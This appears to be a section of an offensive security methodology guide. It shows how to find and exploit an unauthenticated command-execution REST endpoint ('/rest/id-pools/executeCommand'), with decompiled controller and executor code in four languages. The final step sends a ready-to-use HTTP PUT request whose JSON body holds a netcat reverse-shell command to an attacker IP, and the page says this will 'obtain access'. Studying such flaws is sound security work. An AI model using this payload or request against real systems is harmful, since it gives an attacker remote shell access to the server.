{% step %}
Check whether authentication is disabled for the target API in the configuration
{% endstep %}

{% step %}
Decompile the application files and search for the identified API
{% endstep %}

{% step %}
Review the paths, controllers, and `RequestMapping` definitions associated with the target API request (i.e., `executeCommand`), and verify in the source code that authentication is not enforced for this API

{% tabs %}
{% tab title="C#" %}
```csharp
using System;

[..]

[Controller("PoolController")]
[Route("/id-pools")]
[ResourceType("/rest/id-pools")]
[..]
```
{% endtab %}

{% tab title="Java" %}
```java
package com.hp.ci.mgmt.guidpools.controllers;

import [..]

@Controller("PoolController")
@RequestMapping({"/id-pools"})
@ResourceType("/rest/id-pools")
[..]
```
{% endtab %}

{% tab title="PHP" %}
```php
<?php

#[Controller("PoolController")]
#[RequestMapping(["/id-pools"])]
#[ResourceType("/rest/id-pools")]
[..]
```
{% endtab %}

{% tab title="Node.js" %}
```javascript
const [..] = require('[..]');

@Controller("PoolController")
@RequestMapping(["/id-pools"])
@ResourceType("/rest/id-pools")
[..]
```
{% endtab %}
{% endtabs %}

{% tabs %}
{% tab title="C#" %}
```csharp
[HttpPut]
[Route("/executeCommand")]
[ResponseStatus(HttpStatusCode.OK)]
[ResponseBody]
[DocAuthSpecial(SpecialAuthType.NO_AUTH)]
public ExecutableCommand ExecuteCommand(
    HttpRequest request,
    HttpResponse response,
    [FromBody] ExecutableCommand exeCmd,
    [FromHeader(Name = "If-None-Match")] string eTag,
    [FromHeader(Name = "accept-language")] string locale = "en_US",
    [FromHeader] string auth = null
)
{
    LOGGER.Info("Now executing the command {} as user trm7 ", new object[] { exeCmd.GetCmd() });

    bool ret = this.runtimeExecutor.Execute(exeCmd.GetCmd());

    LOGGER.Info("Completed executing the command {} as user trm7 and the status is {} ",
        new object[] { exeCmd.GetCmd(), ret });

    ExecutableCommand exe = new ExecutableCommand();
    exe.SetCmd(exeCmd.GetCmd());
    exe.SetResult(ret);

    return exe;
}
```
{% endtab %}

{% tab title="Java" %}
```java
@RequestMapping(
        value = {"/executeCommand"},
        method = {RequestMethod.PUT}
    )
    @ResponseStatus(HttpStatus.OK)
    @ResponseBody
    @DocAuthSpecial(SpecialAuthType.NO_AUTH)
    public ExecutableCommand executeCommand(HttpServletRequest request, HttpServletResponse response, @RequestBody ExecutableCommand exeCmd, @RequestHeader(value = "If-None-Match",required = false) String eTag, @RequestHeader(value = "accept-language",defaultValue = "en_US") String locale, @RequestHeader(required = false) String auth) throws BaseException {
        LOGGER.info("Now executing the command {} as user trm7 ", new Object[]{exeCmd.getCmd()});
        boolean ret = this.runtimeExecutor.execute(exeCmd.getCmd());
        LOGGER.info("Completed executing the command {} as user trm7 and the status is {} ", new Object[]{exeCmd.getCmd(), ret});
        ExecutableCommand exe = new ExecutableCommand();
        exe.setCmd(exeCmd.getCmd());
        exe.setResult(ret);
        return exe;
    }
```
{% endtab %}

{% tab title="PHP" %}
```php
#[RequestMapping(
        value: ["/executeCommand"],
        method: [RequestMethod::PUT]
    )]
#[ResponseStatus(HttpStatus::OK)]
#[ResponseBody]
#[DocAuthSpecial(SpecialAuthType::NO_AUTH)]
public function executeCommand(
    HttpServletRequest $request,
    HttpServletResponse $response,
    #[RequestBody] ExecutableCommand $exeCmd,
    #[RequestHeader(value: "If-None-Match", required: false)] ?string $eTag,
    #[RequestHeader(value: "accept-language", defaultValue: "en_US")] string $locale,
    #[RequestHeader(required: false)] ?string $auth
): ExecutableCommand {
    LOGGER::info("Now executing the command {} as user trm7 ", [$exeCmd->getCmd()]);

    $ret = $this->runtimeExecutor->execute($exeCmd->getCmd());

    LOGGER::info(
        "Completed executing the command {} as user trm7 and the status is {} ",
        [$exeCmd->getCmd(), $ret]
    );

    $exe = new ExecutableCommand();
    $exe->setCmd($exeCmd->getCmd());
    $exe->setResult($ret);

    return $exe;
}
```
{% endtab %}

{% tab title="Node.js" %}
```javascript
@RequestMapping({
        value: ["/executeCommand"],
        method: ["PUT"]
    })
@ResponseStatus("OK")
@ResponseBody
@DocAuthSpecial(SpecialAuthType.NO_AUTH)
function executeCommand(
    request,
    response,
    exeCmd,
    eTag,
    locale = "en_US",
    auth
) {
    LOGGER.info("Now executing the command {} as user trm7 ", [exeCmd.getCmd()]);

    const ret = this.runtimeExecutor.execute(exeCmd.getCmd());

    LOGGER.info(
        "Completed executing the command {} as user trm7 and the status is {} ",
        [exeCmd.getCmd(), ret]
    );

    const exe = new ExecutableCommand();
    exe.setCmd(exeCmd.getCmd());
    exe.setResult(ret);

    return exe;
}
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
In the source code of this endpoint, determine whether system commands are used to execute or process user input

{% tabs %}
{% tab title="C#" %}
```csharp
using System;
using System.Diagnostics;
using System.Threading;

namespace com.hp.ci.mgmt.guidpools.service
{
    [Scope("singleton")]
    [Service("runtimeexecutor")]
    public class RuntimeExecutorService
    {
        private static readonly DebugLog LOGGER = new DebugLog("guid-app", typeof(RuntimeExecutorService));

        public RuntimeExecutorService()
        {
        }

        public bool Execute(string command)
        {
            try
            {
                Process process = Process.Start(command);

                Thread thread = new Thread(() =>
                {
                    try
                    {
                        process.WaitForExit();
                        int returnCode = process.ExitCode;
                        LOGGER.Info("Return code of command" + command + " = " + returnCode);
                    }
                    catch (ThreadInterruptedException exception)
                    {
                        LOGGER.Warn("InterruptedException while waiting for process", exception);
                        Thread.CurrentThread.Interrupt();
                    }
                });

                thread.Start();
                return true;
            }
            catch (System.IO.IOException exception)
            {
                LOGGER.Warn("Error while execution of command " + command, exception);
                return false;
            }
        }
    }
}
```
{% endtab %}

{% tab title="Java" %}
```java
package com.hp.ci.mgmt.guidpools.service;

import com.hp.ci.mgmt.logs.debug.DebugLog;
import java.io.IOException;
import org.springframework.context.annotation.Scope;
import org.springframework.stereotype.Service;

@Scope("singleton")
@Service("runtimeexecutor")
public class RuntimeExecutorService {
    private static final DebugLog LOGGER = new DebugLog("guid-app", RuntimeExecutorService.class);

    public RuntimeExecutorService() {
    }

    public boolean execute(final String command) {
        Runtime runtime = Runtime.getRuntime();

        try {
            final Process process = runtime.exec(command);
            Thread thread = new Thread() {
                public void run() {
                    try {
                        int returnCode = process.waitFor();
                        RuntimeExecutorService.LOGGER.info("Return code of command" + command + " = " + returnCode);
                    } catch (InterruptedException var2) {
                        InterruptedException exception = var2;
                        RuntimeExecutorService.LOGGER.warn("InterruptedException while waiting for process", exception);
                        Thread.currentThread().interrupt();
                    }

                }
            };
            thread.start();
            return true;
        } catch (IOException var5) {
            IOException exception = var5;
            LOGGER.warn("Error while execution of command " + command, exception);
            return false;
        }
    }
}
```
{% endtab %}

{% tab title="PHP" %}
```php
<?php

namespace com\hp\ci\mgmt\guidpools\service;

use com\hp\ci\mgmt\logs\debug\DebugLog;
use Exception;

#[Scope("singleton")]
#[Service("runtimeexecutor")]
class RuntimeExecutorService
{
    private static DebugLog $LOGGER;

    public function __construct()
    {
    }

    public function execute(string $command): bool
    {
        try {
            $process = proc_open($command, [], $pipes);

            $thread = function () use ($process, $command) {
                try {
                    $returnCode = proc_close($process);
                    RuntimeExecutorService::$LOGGER->info(
                        "Return code of command" . $command . " = " . $returnCode
                    );
                } catch (Exception $exception) {
                    RuntimeExecutorService::$LOGGER->warn(
                        "InterruptedException while waiting for process",
                        $exception
                    );
                }
            };

            $thread();
            return true;
        } catch (Exception $exception) {
            self::$LOGGER->warn(
                "Error while execution of command " . $command,
                $exception
            );
            return false;
        }
    }
}
```
{% endtab %}

{% tab title="Node.js" %}
```javascript
const DebugLog = require('com/hp/ci/mgmt/logs/debug/DebugLog');

@Scope("singleton")
@Service("runtimeexecutor")
class RuntimeExecutorService {
    static LOGGER = new DebugLog("guid-app", RuntimeExecutorService);

    constructor() {
    }

    execute(command) {
        const { exec } = require('child_process');

        try {
            const process = exec(command);

            const thread = async () => {
                try {
                    process.on('exit', (returnCode) => {
                        RuntimeExecutorService.LOGGER.info(
                            "Return code of command" + command + " = " + returnCode
                        );
                    });
                } catch (exception) {
                    RuntimeExecutorService.LOGGER.warn(
                        "InterruptedException while waiting for process",
                        exception
                    );
                }
            };

            thread();
            return true;
        } catch (exception) {
            RuntimeExecutorService.LOGGER.warn(
                "Error while execution of command " + command,
                exception
            );
            return false;
        }
    }
}
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
Send a request to the target API with a JSON body containing system command values and obtain access

```http
PUT /rest/id-pools/executeCommand HTTP/1.1
Host: 192.168.181.132
accept-language: en_US
X-API-Version: 3800
Content-Type: application/json
Content-Length: 61

{
"cmd":"nc -e /bin/sh 192.168.181.129 1337",
"result":0
}
```
{% endstep %}
{% endstepper %}

***

## Cheat Sheet
